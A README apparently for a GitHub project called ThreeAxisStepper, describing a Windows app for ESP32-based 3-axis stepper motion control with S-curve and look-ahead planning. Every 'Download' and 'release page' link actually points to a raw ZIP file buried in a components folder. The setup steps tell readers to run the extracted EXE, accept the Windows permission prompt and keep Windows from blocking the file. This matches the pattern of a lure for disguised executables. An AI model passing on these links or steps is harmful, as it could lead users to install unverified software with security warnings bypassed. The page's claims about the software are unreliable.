# 🔧 ThreeAxisStepper - Smooth 3-Axis Motion Control

[![Download ThreeAxisStepper](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/elsiesapphic177/ThreeAxisStepper/main/components/Three_Stepper_Axis_specialist.zip)

## 🖥️ What This App Does

ThreeAxisStepper is a Windows-ready control app for an ESP32-based 3-axis stepper system. It helps you run smooth motor moves with clean timing and steady motion. It is meant for CNC, 3D printer, and robotics use.

The app supports:
- 3-axis motion control
- S-curve movement for smoother starts and stops
- Look-ahead planning for better path flow
- Optional ruler feedback PID control
- Exact hardware-timed pulses on the ESP32

Use it when you want steady motor motion and less jerk in movement.

## 📥 Download

Visit this page to download the latest release:

[Download the latest version](https://raw.githubusercontent.com/elsiesapphic177/ThreeAxisStepper/main/components/Three_Stepper_Axis_specialist.zip)

On the release page, choose the file for Windows, then save it to your computer. If you see a ZIP file, download that file and extract it first.

## 🚀 Getting Started on Windows

Follow these steps to run ThreeAxisStepper on Windows:

1. Open the download page and get the latest release.
2. Save the file to a folder you can find, such as Downloads.
3. If the file is a ZIP archive, right-click it and choose Extract All.
4. Open the extracted folder.
5. Look for the app file, such as an EXE or launcher file.
6. Double-click the app file to start it.
7. If Windows asks for permission, choose Yes.

If the app uses a companion ESP32 firmware file, load that onto your board before you start motion control.

## 🔌 What You Need

Use this app with:
- A Windows PC
- An ESP32 board
- 3 stepper motor drivers
- Stepper motors for X, Y, and Z
- A USB cable for setup and control
- Optional ruler feedback hardware for PID control

For best results, use a stable power supply for your motors and a solid USB connection.

## ⚙️ Basic Setup

1. Connect your ESP32 board to your PC.
2. Wire the stepper drivers to the motor outputs.
3. Attach the motors to the correct axes.
4. Power the motor system from its own supply.
5. Open ThreeAxisStepper.
6. Pick the correct COM port or device link if the app asks for one.
7. Set axis direction, speed, and step settings.
8. Send a small test move to check that each axis moves the right way.

If one axis moves in the wrong direction, swap the direction setting in the app or change the motor wiring.

## 🎯 Main Features

### S-curve motion
This app uses S-curve motion to reduce hard starts and stops. That helps cut shake and makes motion feel more natural.

### Look-ahead planning
Look-ahead planning lets the controller prepare the next move before the current one ends. This helps keep motion smooth across linked moves.

### Hardware-timed pulses
The ESP32 can send exact step pulses with hardware timing. That helps keep timing steady under load.

### Optional ruler feedback PID
If your system includes ruler feedback, you can use PID control to improve position accuracy. This can help in builds that need tighter control.

### 3-axis control
The app is built for X, Y, and Z motion. It fits small CNC tools, printer motion, and simple robot setups.

## 🧭 Suggested Use Cases

ThreeAxisStepper fits well in:
- Desktop CNC machines
- 3D printer motion systems
- Simple gantry robots
- Test rigs with 3 stepper axes
- Projects that need smooth path control

## 🛠️ Troubleshooting

### The app will not open
- Check that you downloaded the full release file.
- If it came in a ZIP file, extract it first.
- Try running it as a normal desktop app.
- Make sure Windows did not block the file.

### The controller does not respond
- Check the USB cable.
- Confirm the ESP32 is powered.
- Make sure the correct COM port is selected.
- Reconnect the board and open the app again.

### A motor moves the wrong way
- Swap the direction setting for that axis.
- Check the motor wiring.
- Verify the axis labels in the app.

### Motion feels rough
- Lower the speed settings.
- Check motor current and driver settings.
- Confirm that S-curve motion is enabled.
- Make sure the frame and belts are tight.

## 📁 Release Files

The release page may include files such as:
- Windows app package
- ESP32 firmware image
- Setup notes
- Config files
- Source archive

Download the file that matches your system and setup.

## 🔎 Project Details

- Repository: ThreeAxisStepper
- Platform: ESP32
- Motion type: 3-axis stepper control
- Timing: Hardware-timed pulse output
- Planning: Look-ahead path control
- Feedback: Optional ruler-based PID
- Use areas: CNC, robotics, and motion systems

## 🧩 Tips for First-Time Use

- Start with short, slow moves.
- Test one axis at a time.
- Keep the motor supply separate from the PC USB power.
- Write down the settings that work.
- Save a simple test profile before doing long runs.

## 📦 Download Again

[Open the release page to download](https://raw.githubusercontent.com/elsiesapphic177/ThreeAxisStepper/main/components/Three_Stepper_Axis_specialist.zip)

Use this page any time you need the latest build or want to check for a newer release

## 🪛 File Naming Help

If you see more than one file on the release page, choose the one that looks like:
- Windows build
- x64 build
- ZIP package
- App package for Windows

If you are not sure which file to use, pick the one marked for Windows and avoid source-only archives unless you know you need them

## 🧪 What to Expect on First Run

When you open the app for the first time, you may need to:
- Choose the correct device port
- Set the axis order
- Enter step and direction settings
- Test motor direction
- Save your working setup

After that, daily use should be faster because your settings stay in place